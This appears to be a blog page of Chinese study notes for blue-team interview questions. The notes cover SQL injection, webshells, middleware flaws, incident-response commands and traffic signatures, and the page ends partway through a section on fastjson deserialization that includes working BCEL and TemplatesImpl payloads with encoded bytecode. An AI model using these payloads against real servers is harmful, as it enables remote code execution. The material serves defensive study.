<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="1.sql注入原理、分类、绕过123456789原理：产生sql注入漏洞主要因为没有对接受到的参数进行过滤、验证和处理直接拼接到了sql语句中，然后直接执行该sql语句，这样就会导致恶意用户传入一些精心构造的sql代码，与后台sql语句拼接后形成完整的sql语句执行，达到攻击者的目的。分类：	我们可以把sql注入直接的分为字符型和数字型，主要特点就是在进行sql注入的时候是否需要闭合传参的单引号，">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2023/07/05/22%E6%8A%A4%E7%BD%91%E8%93%9D%E5%88%9D%E9%9D%A2%E8%AF%95%E9%A2%982/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="1.sql注入原理、分类、绕过123456789原理：产生sql注入漏洞主要因为没有对接受到的参数进行过滤、验证和处理直接拼接到了sql语句中，然后直接执行该sql语句，这样就会导致恶意用户传入一些精心构造的sql代码，与后台sql语句拼接后形成完整的sql语句执行，达到攻击者的目的。分类：	我们可以把sql注入直接的分为字符型和数字型，主要特点就是在进行sql注入的时候是否需要闭合传参的单引号，">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-07-05T06:46:12.343Z">
<meta property="article:modified_time" content="2023-06-04T14:48:23.380Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-22护网蓝初面试题2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/22%E6%8A%A4%E7%BD%91%E8%93%9D%E5%88%9D%E9%9D%A2%E8%AF%95%E9%A2%982/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T06:46:12.343Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="1-sql注入原理、分类、绕过"><a href="#1-sql注入原理、分类、绕过" class="headerlink" title="1.sql注入原理、分类、绕过"></a>1.sql注入原理、分类、绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">原理：产生sql注入漏洞主要因为没有对接受到的参数进行过滤、验证和处理直接拼接到了sql语句中，然后直接执行该sql语句，这样就会导致恶意用户传入一些精心构造的sql代码，与后台sql语句拼接后形成完整的sql语句执行，达到攻击者的目的。</span><br><span class="line"></span><br><span class="line">分类：</span><br><span class="line">	我们可以把sql注入直接的分为字符型和数字型，主要特点就是在进行sql注入的时候是否需要闭合传参的单引号，不需要闭合说明是数字型，反之就是字符型；</span><br><span class="line">	还可以将sql注入分为有回显的注入和无回显的注入，无回显的注入又别称为盲注，盲注有三大类，布尔盲注、时间盲注以及报错盲注；</span><br><span class="line">	根据sql注入各自的特点可以分为联合注入、二次注入、宽字节注入、堆叠注入等，根据http报文中的不同位置可以有cookie注入、referer注入、x-forwarded-for注入等。</span><br><span class="line"></span><br><span class="line">绕过：大小写绕过 、编码绕过、注释绕过、关键字/关键函数替换、参数污染、缓存区溢出、特殊符号</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="2、报错注入用到的函数、原理"><a href="#2、报错注入用到的函数、原理" class="headerlink" title="2、报错注入用到的函数、原理"></a>2、报错注入用到的函数、原理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数：updatexml、floor、exp</span><br><span class="line"></span><br><span class="line">原理：updatexml（）一共有三个参数，第一个是xml内容、第二个参数是update的位置XPATH路径、第三个参数是更新后的内容；这里报错的主要原理是利用第二个参数，当其校验输入的内容是否符合XPATH格式的时候，不符合就报错，我们将第二个参数替换为version（）或者database（）等等，因为不满足XPATH格式所以会输出错误，输出错误的时候将sql代码（verson()/database()等）执行了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="3、sqlmap用过的tamper-篡改，干预模块-如何防御sql注入"><a href="#3、sqlmap用过的tamper-篡改，干预模块-如何防御sql注入" class="headerlink" title="3、sqlmap用过的tamper(篡改，干预模块)		如何防御sql注入"></a>3、sqlmap用过的tamper(篡改，干预模块)		如何防御sql注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">base64编码、url编码、双url编码、宽字节、使用/**/分割sql关键字、替换空格为xx</span><br><span class="line"></span><br><span class="line">如何防御sql注入漏洞</span><br><span class="line">1、在代码层面使用过滤函数正则表达式等对传入的参数进行一个过滤、检测、处理，使得传入的恶意数据无法按照预想方式执行</span><br><span class="line">2、预编译sql语句</span><br><span class="line">3、使用waf，安全狗，阿里云盾等waf进行防护</span><br><span class="line">4、经常进行基线检查、漏洞扫描等工作</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="4、sql写shell条件-x2F-sqlmap写shell"><a href="#4、sql写shell条件-x2F-sqlmap写shell" class="headerlink" title="4、sql写shell条件&#x2F;sqlmap写shell"></a>4、sql写shell条件&#x2F;sqlmap写shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">1、sql写shell可以用到两个函数outfile和dumpfile可用（select into outfile不可写入二进制可执行文件，select into dumpfile 可写入二进制可执行文件）</span><br><span class="line">2、关闭安全模式（需要数据库允许导出文件也就是secure_file_priv参数配置为空或者是目录地址，设置为NULL的时3、候不允许导出文件）</span><br><span class="line">4、需要足够的权限</span><br><span class="line">5、需要知道网站的绝对路径</span><br><span class="line">6、GPC关闭可使用单引号</span><br><span class="line"></span><br><span class="line">sqlmap --os-shell:</span><br><span class="line">对于mysql数据库来说，--os-shell的本质就是写入两个php文件，其中tmpugvzq.php可以让我们上传文件到网站下，让我们命令执行，并将输出的内容返回sqlmap端，另一个返回课以让我们执行系统命令的命令行；简单的说就是先传小马再传自己的大马。</span><br></pre></td></tr></table></figure>

<h2 id="5、渗透思路"><a href="#5、渗透思路" class="headerlink" title="5、渗透思路"></a>5、渗透思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">信息收集：</span><br><span class="line">1、获取域名whois信息</span><br><span class="line">2、服务器子域名、旁站、c段查询</span><br><span class="line">3、服务器操作系统版本补丁状况、web中间件类型、版本、数据库类型等</span><br><span class="line">4、服务器开放端口：22 ssh  80 web 445 3389.。。</span><br><span class="line">漏洞扫描：</span><br><span class="line">nessus，awvs ，appscan</span><br><span class="line">漏洞验证：</span><br><span class="line">是否存在漏洞，是否可以拿到webshell或者其他权限</span><br><span class="line">权限提升:</span><br><span class="line">windows内核溢出提权，数据库提权、组策略首选项提取、web中间件提权、dll劫持提权、第三方软件/服务提权</span><br><span class="line">linux内核漏洞提权、劫持高权限程序提权、sudoer配置文件错误提权</span><br><span class="line">漏洞利用：</span><br><span class="line">日志清理：</span><br></pre></td></tr></table></figure>

<h2 id="6、中间件漏洞"><a href="#6、中间件漏洞" class="headerlink" title="6、中间件漏洞"></a>6、中间件漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">iis：</span><br><span class="line">	远程代码执行</span><br><span class="line">	解析漏洞   目录以.asp结尾    xxx.asp;1.jpg</span><br><span class="line">tomcat:</span><br><span class="line">	war包后门部署</span><br><span class="line">	远程代码执行</span><br><span class="line">apache：</span><br><span class="line">	解析漏洞    1.php%0a换行解析   1.php.xxx 未知后缀解析</span><br><span class="line">	SSI远程命令执行</span><br><span class="line">	路径穿越</span><br><span class="line">nginx：</span><br><span class="line">	解析漏洞    1.jpg/.php</span><br><span class="line">	目录穿越 （nginx配置别名的时候alias的时候，忘记加/  将造成目录穿越漏洞）</span><br><span class="line">	CRLF注入 (Nginx会将$uri进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞)</span><br><span class="line">jboss:</span><br><span class="line">	反序列化</span><br><span class="line">	war后门部署</span><br><span class="line">weblogic：</span><br><span class="line">	反序列化</span><br><span class="line">	ssrf任意文件上传</span><br><span class="line">	文件读取</span><br></pre></td></tr></table></figure>

<h2 id="7、序列化反序列化及其流量特征"><a href="#7、序列化反序列化及其流量特征" class="headerlink" title="7、序列化反序列化及其流量特征"></a>7、序列化反序列化及其流量特征</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">序列化：对象转换为字符串</span><br><span class="line">反序列化：字符串转换为对象</span><br><span class="line">流量特征：</span><br><span class="line">shiro反序列化：查看cookie中rememberme字段，恶意命令要从这里传入。判断是否有漏洞，查看返回包set cookie：rememberme=deleteme，验证失败返回的标识符。</span><br><span class="line">fastjson反序列化：请求报文中查找json格式的数据，重点看有无rmi或者出网的一些行为</span><br><span class="line">st2-045：请求头中的Content-Type字段</span><br></pre></td></tr></table></figure>

<h2 id="8、应急响应流程及windows-x2F-linux用到的命令"><a href="#8、应急响应流程及windows-x2F-linux用到的命令" class="headerlink" title="8、应急响应流程及windows&#x2F;linux用到的命令"></a>8、应急响应流程及windows&#x2F;linux用到的命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">应急响应流程：</span><br><span class="line">1、收集信息：搜集客户信息和中毒信息，备份</span><br><span class="line">2、判断类型：判断是否是安全事件、是何种安全事件（勒索病毒、挖矿、断网、ddos等）</span><br><span class="line">3、深入分析：日志分析、进程分析、启动项分析、样本分析</span><br><span class="line">4、清理处置：杀掉恶意进程、删除恶意文件、打补丁、修复文件</span><br><span class="line">5、产出报告：整理并输出完整的安全事件报告</span><br><span class="line"></span><br><span class="line">windows应急</span><br><span class="line">一、查看系统账号安全</span><br><span class="line">1、查看服务器是否有弱口令、可疑账号、隐藏账号、克隆账号、远程管理端口是否对公网开放</span><br><span class="line">2、win+r（eventwmr.msc）查看系统日志，查看管理员登录时间、用户名是否存在异常</span><br><span class="line">二、检查异常端口、进程</span><br><span class="line">1、netstat -ano 检查端口连接情况，是否有远程连接、可疑连接</span><br><span class="line">2、tasklist | findstr &quot;PID&quot;根据pid定位进程</span><br><span class="line">3、使用功能查杀工具</span><br><span class="line">三、启动项检查、计划任务、服务</span><br><span class="line">1、检查服务器是否有异常的启动项，msconfig看一下启动项是否有可以的启动</span><br><span class="line">2、检查计划任务，查看计划任务属性，可以发现木马文件的路径</span><br><span class="line">3、见擦汗服务自启动，services.msc注意服务状态和启动类型，检查是否有异常服务</span><br><span class="line">四、检查系统相关信息</span><br><span class="line">1、查看系统版本以及补丁信息  systeminfo</span><br><span class="line">2、查找可以目录及文件  是否有新建用户目录 分析最近打开分析可疑文件（%UserProfile%\Recent）  </span><br><span class="line">五、自动化查杀</span><br><span class="line">使用360 火绒剑 webshell后门可以使用d盾 河马等</span><br><span class="line">六、日志分析</span><br><span class="line">360星图日志分析工具  ELK分析平台</span><br><span class="line"></span><br><span class="line">linux应急</span><br><span class="line">1、检查用户及密码文件/etc/passwd、/etc/shadow 是否存在多余帐号，主要看一下帐号后面是否是 nologin,如果没有 nologin 就要注意；</span><br><span class="line">2、通过 who 命令查看当前登录用户（tty 本地登陆 pts 远程登录）、w 命令查看系统信息，想知道某一时刻用户的行为、uptime查看登陆多久、多少用户，负载；</span><br><span class="line">3、修改/etc/profile的文件，在尾部添加相应显示间、日期、ip、命令脚本代码，这样输入history命令就会详细显示攻击者 ip、时间历史命令等；</span><br><span class="line">4、用 netstat -antlp|more命令分析可疑端口、IP、PID，查看下 pid 所对应的进程文件路径，运行ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的pid 号）；</span><br><span class="line">5、使用ps命令，分析进程 ps aux | grep pid</span><br><span class="line">6、使用 vi /etc/inittab 查看系统当前运行级别，通过运行级别找到/etc/rc.d/rc[0~6].d对应目录是否存在可疑文件；</span><br><span class="line">7、看一下crontab定时任务是否存在可疑启用脚本；</span><br><span class="line">8、使用chkconfig --list 查看是否存在可疑服务；</span><br><span class="line">9、通过grep awk命令分析/var/log/secure安全日志里面是否存在攻击痕迹；</span><br><span class="line">10、chkrootkit、rkhunter、Clamav 病毒后门查杀工具对 Linux 系统文件查杀；</span><br><span class="line">11、如果有 Web 站点，可通过 D 盾、河马查杀工具进行查杀或者手工对代码按脚本木马关键字、关键涵数（evel、system、shell_exec、exec、passthru system、popen）进行查杀Webshell 后门。</span><br></pre></td></tr></table></figure>

<h2 id="9、流量分析"><a href="#9、流量分析" class="headerlink" title="9、流量分析"></a>9、流量分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">拿到流量包后将其导入wireshark中，使用过滤规则对流量包进行分析，常用的过滤规则有：</span><br><span class="line">http contains &quot;关键字&quot;</span><br><span class="line">http.response.code == 200</span><br><span class="line">http.request.method == POST</span><br><span class="line">tcp.prot == 80</span><br><span class="line">ip.addr == &quot;10.1.1.1&quot;</span><br><span class="line">ip.src</span><br><span class="line">ip.dst</span><br></pre></td></tr></table></figure>

<h2 id="10、Behinder流量特征"><a href="#10、Behinder流量特征" class="headerlink" title="10、Behinder流量特征"></a>10、Behinder流量特征</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">冰蝎是一款基于java开发的动态加密通信流量的新型webshell客户端，冰蝎的通信过程可以分为两个阶段：秘钥协商 加密传输</span><br><span class="line"></span><br><span class="line">冰蝎2：</span><br><span class="line">ua头比较老，虽然内置了10余种，每次连接shell都会随机选择一个进行使用，由于比较老，容易被检测出来</span><br><span class="line">content-length：16  #16是冰蝎2连接的特征</span><br><span class="line"></span><br><span class="line">冰蝎3：</span><br><span class="line">冰蝎3取消了动态秘钥获取 accept头有application/xhtml+xmlapplication/xmlapplication/signed-exchange属于弱特征</span><br><span class="line">ua头版本老：冰蝎3内置16个ua头都比较老，现实生活中使用较少。</span><br></pre></td></tr></table></figure>

<h2 id="11、天眼基本搜索语法"><a href="#11、天眼基本搜索语法" class="headerlink" title="11、天眼基本搜索语法"></a>11、天眼基本搜索语法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sip:&quot;10.1.1.1&quot; AND dip:&quot;10.1.1.2&quot; AND status:(200) </span><br><span class="line">#10.1.1.1访问服务器10.1.1.2状态码为200的流量日志</span><br><span class="line">dport:&quot;443&quot; OR dport:&quot;8080</span><br><span class="line">#访问端口是443或者8080的流量日志</span><br><span class="line">dport:&quot;80&quot; NOT host:&quot;www.example.com&quot;</span><br><span class="line">#访问端口为80，排除访问www.example.com域名的流量日志</span><br><span class="line">dip:&quot;10.1.1.2&quot; AND client_os:&quot;windows7&quot;</span><br><span class="line">#服务器ip为10.1.1.2,操作系统为windows7的流量日志</span><br><span class="line">处置方案：</span><br><span class="line">传感器上出现sql注入告警后</span><br><span class="line">1、验证此条sql注入告警是否真的存在sql注入漏洞</span><br><span class="line">2、通过请求数据包判断触发告警的行为是客户自身还是攻击行为</span><br><span class="line">3、若为自身业务问题，则将漏洞点相关整合成报告反馈客户</span><br><span class="line">4若为攻击者行为，需要进一步分析，查看分析平台攻击ip除了sql注入外是否有其他攻击行为，攻击的结果如何</span><br><span class="line">5、将发现时间及攻击行为反馈给护网客户</span><br><span class="line">传感器上出现RCE告警</span><br><span class="line">1、验证此条警告是否真的成功（若成功直接出报告）</span><br><span class="line">2、若失败，判断攻击者是手工还是工具批量扫描行为</span><br><span class="line">3、进入分析平台进一步分析，查看分析平台攻击ip除了rce是否有其他攻击行为，攻击结果如何</span><br><span class="line">4、将发现时间及攻击行为反馈给护网</span><br></pre></td></tr></table></figure>

<h2 id="12、fastjson反序列化"><a href="#12、fastjson反序列化" class="headerlink" title="12、fastjson反序列化"></a>12、fastjson反序列化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fastjson1.2.24反序列化漏洞原理</span><br><span class="line">1、fastjson提供的反序列化功能允许用户传入json格式数据局的时候通过@type的value值指定任意反序列化类名</span><br><span class="line">2、fastjson的反序列化机制会将反序列的类进行实例化对象，并调用该对象的setter和部分getter方法</span><br><span class="line">3、恶意用户可以构造payload是目标应用的代码执行流程进入这部分setter和getter方法，如果这些方法中存在Gadget，就会造成一些安全问题。</span><br><span class="line">4、官方采取黑名单过滤的方法，对反序列化的类名进行校验，checkAutoType不断被绕过</span><br><span class="line">fastjson利用流程：</span><br><span class="line">使用@type的value字段执行反序列化的类，例如JdbcRowSetImpl这个类，接着将这个类中的成员变量datasourcename的value值设为rmi远程加载类，这样fastjson在将传入的类反序列化、实例对象后，会通过成员变量传入的value值，请求rmi服务器，最后rmi返回远程类，fastjson执行这个远程恶意类。导致rce漏洞。</span><br><span class="line">fastjson反序列化的特征：</span><br><span class="line">在请求包中查找json格式的字符串，重点在于rmi和一些出网操作</span><br></pre></td></tr></table></figure>

<h2 id="13、fastjson不出网利用"><a href="#13、fastjson不出网利用" class="headerlink" title="13、fastjson不出网利用"></a>13、fastjson不出网利用</h2><h4 id="1、基于BasicDataSource类"><a href="#1、基于BasicDataSource类" class="headerlink" title="1、基于BasicDataSource类"></a>1、基于BasicDataSource类</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.apache.tomcat.dbcp.dbcp2.BasicDataSource</span><br><span class="line">条件：BasicDataSource需要有dbcp或者tomcat-dbcp的依赖</span><br><span class="line">利用过程：使用BasicDataSource链，构造恶意类后将其的字节码转化为BCEL格式，其中driverClassName和driverClassLoader都是可控的，由用户输入，指定ClassLoader为com.sun.org.apache.bcel.internal.util.ClassLoader，设置ClassName为BCEL..这种格式，字啊newInstance方法执行后被实例化，第二个参数initial为true时，类加载后将会直接执行static&#123;&#125;块中的代码。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">	&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">	&quot;driverClassLoader&quot;: &#123;&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,</span><br><span class="line">	&quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7d$91$cfN$C1$Q$c6$bf$c2$$$c5$ba$C$o$e2$3fD$b8$n$HI$bcJ$bc$YM$d0U$P$Q$8e$seidq$dd$dd$y$8b$f1$8d$3csQ$e3$c1$H$f0$a1$8c$b3$F5$5el$d2$99$ce7$9d_$a7$ed$c7$e7$db$3b$80C$d4$F$b2$d801$li$81Mlql$L$98$d8$e1$a8p$ec2d$da$ae$ef$c6$c7$M$e9$c6$7e$9f$c18$J$86$8a$no$bb$be$ba$9a$de$PT$d4$93$D$8f$94$a2$j8$d2$eb$cb$c8M$e2$85h$c4$pw$c2$c0$ed$89$a7Tx$c4$90m$3b$de$82$c7$u_$b3$c7$f2A$b6$3c$e9$df$b6$3a$7e$ac$a2h$g$c6jx$fa$e8$a80v$D$9f$wV$ba$b1t$ee$$e$a8$91$d4$j$83$e8$G$d3$c8Qgnr$84$d0$e8$83$84ca$J$82$a3j$a1$82$3d$86$ea$ffl$L5$I$GS$d73$U$7ew_$P$c6$ca$89$ffH$bdQ$a4$e4$90$$$d48O$5e$n$lF$ae$l$eb$cez$91t$U$ea$e0$f4$94$c9H$81$rm$90$5d$a6$a8E$9e$917$9b$_$603$9d$b6$c8f$b4H$97$pk$cd7$m$87$3c$f9$y$K$3f$c57$g$G$e4KH$bd$c2xB$f6$a2$f9$8c$ccL$8b$Z$3a$c5DZ$e3$caH$fe$d0$m$8dkU$d0$wG$a8o$bc$a0$dc$w$8a$U$ad$d1$e4Hu8J$G$r$d6uG$e5$_$H$X$vT$R$C$A$A&quot;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line">import com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line">import com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        JavaClass cls = Repository.lookupClass(Exp.class);</span><br><span class="line">        String code = Utility.encode(cls.getBytes(), true);</span><br><span class="line">        code = &quot;$$BCEL$$&quot; + code;</span><br><span class="line">        new ClassLoader().loadClass(code).newInstance();</span><br><span class="line">        System.out.println(code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、基于com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl类"><a href="#2、基于com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl类" class="headerlink" title="2、基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类"></a>2、基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAIUG9jLmphdmEMAAgACQcAIQwAIgAjAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAJAAlAQADUG9jAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACwAAAA4AAwAAAAsABAAMAA0ADQAMAAAABAABAA0AAQAOAA8AAQAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAABEAAQAOABAAAgAKAAAAGQAAAAMAAAABsQAAAAEACwAAAAYAAQAAABYADAAAAAQAAQARAAkAEgATAAIACgAAACUAAgACAAAACbsABVm3AAZMsQAAAAEACwAAAAoAAgAAABkACAAaAAwAAAAEAAEAFAABABUAAAACABY=&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,